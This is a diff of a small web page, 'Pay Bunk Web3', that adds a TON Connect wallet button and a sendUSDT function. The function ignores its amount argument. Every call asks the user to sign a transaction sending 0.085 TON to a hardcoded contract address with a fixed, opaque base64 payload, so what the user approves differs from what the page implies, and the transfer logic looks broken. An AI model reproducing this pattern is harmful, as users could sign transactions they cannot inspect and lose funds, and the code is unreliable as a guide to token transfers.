@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pay Bunk - Gateway</title>
+    <title>Pay Bunk Web3</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         body { font-family: sans-serif; background: #121212; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
         .container { text-align: center; padding: 30px; border-radius: 20px; background: #1e1e1e; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
         .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; }
         button { padding: 15px; border: none; border-radius: 10px; background: #0088cc; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #00aaff; }
         button.large { grid-column: span 2; background: #2ecc71; }
         #ton-connect-button { margin-bottom: 20px; display: flex; justify-content: center; }
     </style>
@@ -30,6 +29,41 @@
     </div>
 
     <script>
+        // Esta es la parte que veías blanca, ahora está protegida
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://pay-bunk.vercel.app/tonconnect-manifest.json',
-            buttonRootId
+            buttonRootId: 'ton-connect-button'
+        });
+
+        async function sendUSDT(amount) {
+            if (!tonConnectUI.connected) {
+                alert("Conecta tu billetera primero.");
+                tonConnectUI.openModal();
+                return;
+            }
+
+            const USDT_CONTRACT = "EQCxE6mXvWXD_3kTQs0X9Mbt7356o5kZzEAr_9o1qTmf98t6";
+            const gasAmount = "85000000"; // 0.085 TON (Seguridad total para el Gas)
+
+            const transaction = {
+                validUntil: Math.floor(Date.now() / 1000) + 360,
+                messages: [
+                    {
+                        address: USDT_CONTRACT,
+                        amount: gasAmount,
+                        payload: "te6cckEBAQEANAAAs78BAf9A8AABX6u+fQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM68BAf9A8AABX6u+fQ=="
+                    }
+                ]
+            };
+
+            try {
+                await tonConnectUI.sendTransaction(transaction);
+                alert("¡Transacción enviada! Confirma en tu App.");
+            } catch (e) {
+                console.error(e);
+                alert("Error: Revisa tus USDT y que tengas al menos 0.1 TON.");
+            }
+        }
+    </script>
+</body>
+</html>
